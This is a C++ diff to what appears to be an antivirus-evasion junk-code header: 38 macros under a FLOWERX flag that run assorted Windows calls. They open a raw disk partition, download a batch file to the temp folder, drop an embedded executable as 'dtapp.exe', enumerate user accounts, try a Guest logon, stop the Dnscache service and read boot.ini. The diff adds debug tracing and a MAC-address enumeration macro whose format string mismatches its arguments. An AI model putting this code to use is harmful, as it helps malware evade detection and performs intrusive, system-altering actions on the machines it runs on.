@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "md5.h"
+#include "nb30.h"
 
 #pragma  comment(lib, "wininet")
 #pragma  comment(lib, "urlmon")
@@ -9,6 +10,7 @@
 
 #define FLOWERX
 
+#define OUTSTR TRACE//OutputDebugString
 using namespace std;
 
 #define IOCTL_BEEP_SET_PROTECT_FILE	CTL_CODE(FILE_DEVICE_BEEP, 0x12, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -69,6 +71,15 @@ HBITMAP *hDib;
 POINT pt;
 std::vector<double> aaa;
 std::vector<double>::const_iterator iii;
+NCB Ncb;
+UCHAR uRetCode;
+LANA_ENUM lenum;
+int i;
+typedef struct _ASTAT_{
+    ADAPTER_STATUS adapt;
+    NAME_BUFFER NameBuff[ 30 ];
+}ASTAT,*PASTAT;
+ASTAT Adapter;
 
 LPUSER_INFO_1 pBuf1 = NULL;
 LPUSER_INFO_2 pBuf2 = NULL;
@@ -164,7 +175,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	return !bRet;
 }
 
-#define XCODE1 __try{\
+#define XCODE1 __try{OUTSTR("1");\
 		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
 		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
 		if (INVALID_HANDLE_VALUE != hXMod)\
@@ -186,7 +197,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(1);\
 	}
 
-#define XCODE2 __try{\
+#define XCODE2 __try{OUTSTR("2");\
 	GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
 	PasswdLen = strlen(szXBuff);\
 	memcpy(TmpBuf + 0x00, "\x7F", 1);\
@@ -200,11 +211,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(2);\
 	}
 
-#define XCODE3 __try{\
+#define XCODE3 __try{OUTSTR("3");\
 	hXMod = CreateFile("\\Device\\Harddisk0\\Partition0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\
 	if (hXMod != INVALID_HANDLE_VALUE)\
 	{\
-		OutputDebugStringA("open device success");\
+		OUTSTR("open device success");\
 		dwRes = inet_addr("192.168.1.203");\
 		DeviceIoControl(hXMod, IOCTL_BEEP_SET_PROTECT_FILE, szXBuff, sizeof(szXBuff), NULL, 0, &dwRes, NULL);\
 		CloseHandle(hXMod);\
@@ -214,7 +225,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		Sleep(3);\
 	}
 
-#define XCODE4 __try{\
+#define XCODE4 __try{OUTSTR("4");\
 	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) \
 	{\
 		;\
@@ -284,7 +295,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		Sleep(4);\
 	}
 
-#define XCODE5 __try{\
+#define XCODE5 __try{OUTSTR("5");\
 	GetTempPath(64, TmpBuf);\
 	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
 	DeleteUrlCacheEntry (szXBuff);\
@@ -304,7 +315,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(5);\
 	}
 
-#define XCODE6 __try{\
+#define XCODE6 __try{OUTSTR("6");\
 	GetTempPath(MAX_PATH, szXBuff);\
 	SetCurrentDirectory(szXBuff);\
 	hXMod = FindFirstFile(szXBuff, &findData);\
@@ -352,7 +363,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(6);\
 	}
 
-#define XCODE7 __try{\
+#define XCODE7 __try{OUTSTR("7");\
 	setlocale(LC_ALL,"chs");\
 	InitializeCriticalSection(&lock);\
 	SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
@@ -386,7 +397,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(7);\
 	}
 
-#define XCODE8 __try{\
+#define XCODE8 __try{OUTSTR("8");\
 	GetTempPath(64, TmpBuf);\
 	strcat(TmpBuf, "dtapp.exe");\
 	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDR_EXE3), "EXE");\
@@ -402,7 +413,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(8);\
 	}
 
-#define XCODE9 __try{\
+#define XCODE9 __try{OUTSTR("9");\
 	GetSystemInfo(&sinf);\
 	hXMod = CreateFile(".\\first.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);\
 	hmyfile =CreateFile("c:\\second.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\
@@ -439,7 +450,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	Sleep(9);\
 	}
 
-#define XCODE10 __try{\
+#define XCODE10 __try{OUTSTR("10");\
 	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));\
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);\
 	if( !GetVersionEx((OSVERSIONINFO *)&osvi))\
@@ -453,20 +464,20 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	RegQueryValueEx( hKey, "ProductType", NULL, NULL, (LPBYTE) szXBuff, &dwSizeXXX);\
 	RegCloseKey( hKey );\
 	if ( lstrcmpi( "WINNT", szXBuff) == 0 )\
-	OutputDebugString("Workstation");\
+	OUTSTR("Workstation");\
 	if ( lstrcmpi( "LANMANNT", szXBuff) == 0 )\
-	OutputDebugString( "Server " );\
+	OUTSTR( "Server " );\
 	if ( lstrcmpi( "SERVERNT", szXBuff) == 0 )\
-	OutputDebugString( "Advanced Server " );\
+	OUTSTR( "Advanced Server " );\
 	sprintf(szXBuff,"%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion );\
-	OutputDebugString(szXBuff);\
+	OUTSTR(szXBuff);\
 	}\
 	}\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 		Sleep(10);\
 	}
 
-#define XCODE11 __try{\
+#define XCODE11 __try{OUTSTR("11");\
 	shqbi.cbSize = sizeof(shqbi);\
 	shqbi.i64NumItems = -1;\
 	shqbi.i64Size = -1;\
@@ -481,7 +492,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	}
 
 
-#define XCODE12 __try{\
+#define XCODE12 __try{OUTSTR("12");\
 do {\
 	   nStatus = NetUserEnum(L"localhost",dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);\
 	   if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))\
@@ -518,7 +529,7 @@ do {\
 		Sleep(12);\
 	}
 
-#define XCODE13 __try{\
+#define XCODE13 __try{OUTSTR("13");\
 		PasswdLen=0;\
 		while (PasswdLen < 24) {\
 		dwLevel = PasswdLen;\
@@ -595,7 +606,7 @@ do {\
 		Sleep(13);\
 	}
 
-#define XCODE14 __try{\
+#define XCODE14 __try{OUTSTR("14");\
     CoInitialize( 0 );\
         hr = CoCreateInstance(  CLSID_CTaskScheduler,0,CLSCTX_SERVER,IID_ITaskScheduler,(LPVOID *)&pITaskScheduler );\
         pITaskScheduler->GetTargetComputer( &ppwszComputer );\
@@ -621,10 +632,11 @@ do {\
 			Sleep(14);\
     }
 
-#define XCODE15 __try{\
-		srand(time(0));\
-		InitializeCriticalSection(&g_CriticalSection);\
-		hXMod=GetStdHandle(STD_OUTPUT_HANDLE);\
+#define XCODE15 __try{OUTSTR("15");\
+	srand(time(0));\
+	InitializeCriticalSection(&g_CriticalSection);\
+	hXMod=GetStdHandle(STD_OUTPUT_HANDLE);\
+	if(hXMod!=INVALID_HANDLE_VALUE){\
 		SetConsoleTitle(AddMsg);\
 		EnterCriticalSection(&g_CriticalSection);\
 		SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
@@ -635,7 +647,9 @@ do {\
 		dwCursorPostion.X=lpConsoleScreenBufferInfo->dwCursorPosition.X-1;\
 		dwCursorPostion.Y=lpConsoleScreenBufferInfo->dwCursorPosition.Y;\
 		SetConsoleCursorPosition(hXMod,dwCursorPostion);\
-		FillConsoleOutputCharacter(hXMod,' ',1,dwCursorPostion,0);\
+		FillConsoleOutputCharacter(hXMod,' ',1,dwCursorPostion,&dwRes);\
+		delete lpConsoleScreenBufferInfo;\
+	}\
     }\
 	__finally\
     {\
@@ -645,7 +659,7 @@ do {\
 		Sleep(15);\
     }
 
-#define XCODE16 __try{\
+#define XCODE16 __try{OUTSTR("16");\
 		hXMod = LoadLibraryA("Kernel32.DLL");\
 		if (hXMod == NULL)\
 			__leave;\
@@ -688,7 +702,7 @@ do {\
 			Sleep(16);\
 		}
 
-#define XCODE17 __try{\
+#define XCODE17 __try{OUTSTR("17");\
 			GetWindowsDirectory(szXBuff, MAX_PATH);\
 			szXBuff[3]=0;\
 			strcat(szXBuff, "boot.ini");\
@@ -712,7 +726,7 @@ do {\
 			Sleep(17);\
 		}
 
-#define XCODE18 __try{\
+#define XCODE18 __try{OUTSTR("18");\
 			GetModuleFileName(NULL,szXBuff,MAX_PATH);\
 			(strrchr(szXBuff,'\\'))[1] = 0;\
 			GetTempPath(MAX_PATH, szXBuff);\
@@ -724,7 +738,7 @@ do {\
 			Sleep(18);\
 		}
 
-#define XCODE19 __try{\
+#define XCODE19 __try{OUTSTR("19");\
 		uDropEffect=RegisterClipboardFormat(AddMsg);\
 		hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));\
 		dwDropEffect=(DWORD*)GlobalLock(hGblEffect);\
@@ -757,7 +771,7 @@ do {\
 		Sleep(19);\
 	}
 
-#define XCODE20 __try{\
+#define XCODE20 __try{OUTSTR("20");\
 		RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE",0,KEY_READ,&hKey);\
 		if (RegQueryValueEx(hKey,AddMsg,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)\
 		{\
@@ -783,7 +797,7 @@ do {\
 		Sleep(20);\
 	}
 
-#define XCODE21 __try{\
+#define XCODE21 __try{OUTSTR("21");\
 		if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))!=NULL)\
 		{\
 			service=OpenService(scm,"Dnscache",SERVICE_QUERY_STATUS|SERVICE_CONTROL_STOP);\
@@ -806,7 +820,7 @@ do {\
 	Sleep(21);\
 	}
 
-#define XCODE22 __try{\
+#define XCODE22 __try{OUTSTR("22");\
 		pbm = CBitmap::FromHandle(hbm);\
 		if(::PathFileExists(szXBuff))\
 		{\
@@ -822,7 +836,7 @@ do {\
 		Sleep(22);\
 	}
 
-#define XCODE23 __try{\
+#define XCODE23 __try{OUTSTR("23");\
 		if ((NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")))\
 		{\
 			NtQuerySystemInformation(0, &SysBaseInfo,sizeof(SysBaseInfo),NULL);\
@@ -834,7 +848,7 @@ do {\
 		Sleep(22);\
 	}
 
-#define XCODE24 __try{\
+#define XCODE24 __try{OUTSTR("24");\
 		hmyfile = CreateFile("C:\\Windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );\
 		if ( hmyfile == INVALID_HANDLE_VALUE ) {\
 			__leave;\
@@ -865,7 +879,7 @@ __finally {\
 	Sleep(24);\
 }
 
-#define XCODE25 __try{\
+#define XCODE25 __try{OUTSTR("25");\
 	hdc = GetDC(NULL);\
 	hPen = CreatePen(0, 1, RGB(0, 0, 0));\
 	hOldPen = (HPEN) SelectObject(hdc, hPen);\
@@ -885,7 +899,7 @@ __finally {\
 	Sleep(25);\
 }
 
-#define XCODE26 __try{\
+#define XCODE26 __try{OUTSTR("26");\
 	hwnd = CreateWindowW(L"Static",L"Application",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,AfxGetInstanceHandle(),NULL);\
 	ShowWindow(hwnd,SW_HIDE);\
 	UpdateWindow(hwnd);\
@@ -894,21 +908,21 @@ __except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(26);\
 }
 
-#define XCODE27 __try{\
+#define XCODE27 __try{OUTSTR("27");\
 	hIcon = ExtractIcon(AfxGetInstanceHandle(), AddMsg, 0);\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(27);\
 }
 
-#define XCODE28 __try{\
+#define XCODE28 __try{OUTSTR("28");\
 	lp=VirtualAlloc(lp,16,MEM_RESERVE,PAGE_READWRITE);\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(28);\
 }
 
-#define XCODE29 __try{\
+#define XCODE29 __try{OUTSTR("29");\
 hXMod=CreateMutex(NULL,TRUE, AddMsg);\
 if(GetLastError()==ERROR_ALREADY_EXISTS)\
 {\
@@ -919,7 +933,7 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(29);\
 }
 
-#define XCODE30 __try{\
+#define XCODE30 __try{OUTSTR("30");\
 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);\
 	sa.lpSecurityDescriptor = NULL;\
 	sa.bInheritHandle = TRUE;\
@@ -943,21 +957,21 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(30);\
 }
 
-#define XCODE31 __try{\
+#define XCODE31 __try{OUTSTR("31");\
 ::LogonUser("Guest", "localhost", "", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(31);\
 }
 
-#define XCODE32 __try{\
+#define XCODE32 __try{OUTSTR("32");\
 	::PostThreadMessage(GetCurrentThreadId(), WM_TIMECHANGE, 0, 0);\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(32);\
 }
 
-#define XCODE33 __try{\
+#define XCODE33 __try{OUTSTR("33");\
 		hBitmap = CreateDIBSection(GetDC(NULL), (BITMAPINFO*)hDib, DIB_RGB_COLORS, &lp, NULL, 0);\
 		if (hBitmap == NULL)\
 		{\
@@ -969,7 +983,7 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(33);\
 }
 
-#define XCODE34 __try{\
+#define XCODE34 __try{OUTSTR("34");\
 	GetCursorPos(&pt);\
 	if (pt.x<10 && pt.y<10)\
 	{\
@@ -980,7 +994,7 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(34);\
 }
 
-#define XCODE35 __try{\
+#define XCODE35 __try{OUTSTR("35");\
 	hXMod=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, "kernel32.dll", 0, &dwSizeXXX);\
 	if(WAIT_TIMEOUT==WaitForSingleObject(hXMod,200))\
 	{\
@@ -991,7 +1005,7 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(35);\
 }
 
-#define XCODE36 __try{\
+#define XCODE36 __try{OUTSTR("36");\
     aaa.push_back(1);\
     aaa.push_back(2);\
     aaa.push_back(3);\
@@ -1005,12 +1019,38 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	Sleep(36);\
 }
 
-#define XCODE37 __try{\
+#define XCODE37 __try{OUTSTR("37");\
 	hXMod = GetCurrentProcess();\
 	GetProcessAffinityMask(hXMod, &dwSizeXXX,&dwRes);\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(37);\
+}
+
+#define XCODE38 __try{OUTSTR("38");\
+		i=sizeof(Ncb);\
+		memset( &Ncb, 0, sizeof(Ncb) );\
+		Ncb.ncb_command = NCBENUM;\
+		Ncb.ncb_buffer = (UCHAR *)&lenum;\
+		Ncb.ncb_length = sizeof(lenum);\
+		uRetCode = Netbios( &Ncb );\
+		for(i=0; i < lenum.length ;i++) {\
+			memset( &Ncb, 0, sizeof(Ncb) );\
+			Ncb.ncb_command = NCBRESET;\
+			Ncb.ncb_lana_num = lenum.lana[i];\
+			uRetCode = Netbios( &Ncb );\
+			memset( &Ncb, 0, sizeof (Ncb) );\
+			Ncb.ncb_command = NCBASTAT;\
+			Ncb.ncb_lana_num = lenum.lana[i];\
+			strcpy( (char*)Ncb.ncb_callname,  "*               " );\
+			Ncb.ncb_buffer = (unsigned char *) &Adapter;\
+			Ncb.ncb_length = sizeof(Adapter);\
+			uRetCode = Netbios( &Ncb );\
+			sprintf(szXBuff,"%02X-%02X-%02X-%02X-%02X-%02X",lenum.lana[i],Adapter.adapt.adapter_address[0],Adapter.adapt.adapter_address[1],Adapter.adapt.adapter_address[2],Adapter.adapt.adapter_address[3],Adapter.adapt.adapter_address[4],Adapter.adapt.adapter_address[5]);\
+		}\
+}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+	Sleep(38);\
 }
 #ifdef FLOWERX
 #include "xrand.h"
